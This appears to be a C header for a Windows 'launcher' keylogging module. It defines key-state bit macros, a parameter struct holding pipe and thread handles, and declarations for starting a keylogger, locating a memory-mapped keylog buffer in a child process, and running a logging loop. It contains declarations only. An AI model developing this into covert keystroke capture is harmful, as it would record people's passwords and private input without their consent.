#ifndef LAUNCHER_KEYLOG_H
#define LAUNCHER_KEYLOG_H

#include "utils/vec.h"
#include <Windows.h>
#include <stdint.h>

#define KS_LOCK_BIT   0x01
#define KS_DOWN_BIT   0x80
#define GET_KS_BYTE(vk) ((vk) * 2 / 8)
#define GET_KS_DOWN_BIT(vk) (1 << (((vk) % 4) * 2))
#define GET_KS_LOCK_BIT(vk) (1 << (((vk) % 4) * 2 + 1))

#define IS_KEY_LOCKED(ks, vk)(((ks)[GET_KS_BYTE(vk)] & GET_KS_LOCK_BIT(vk)) ? TRUE : FALSE)
#define IS_KEY_DOWN(ks, vk) (((ks)[GET_KS_BYTE(vk)] & GET_KS_DOWN_BIT(vk)) ? TRUE : FALSE)
#define SET_KEY_DOWN(ks, vk, down)                                                                 \
    (ks)[GET_KS_BYTE(vk)] =                                                                        \
        ((down) ? ((ks)[GET_KS_BYTE(vk)] | GET_KS_DOWN_BIT(vk))                                    \
                : ((ks)[GET_KS_BYTE(vk)] & ~GET_KS_DOWN_BIT(vk)))

typedef struct
{
    HANDLE child_pipe;
    HANDLE jop_thread;
    Vec *pipes;
} KeyLogParams;

DWORD keylog_start(KeyLogParams *params);
bool keylog_find_memory_mapped_buffer(HANDLE child_pipe, void **keylog_base_address);
void keylog_main_loop(HANDLE child_pipe, uint8_t *map_base_address);
#endif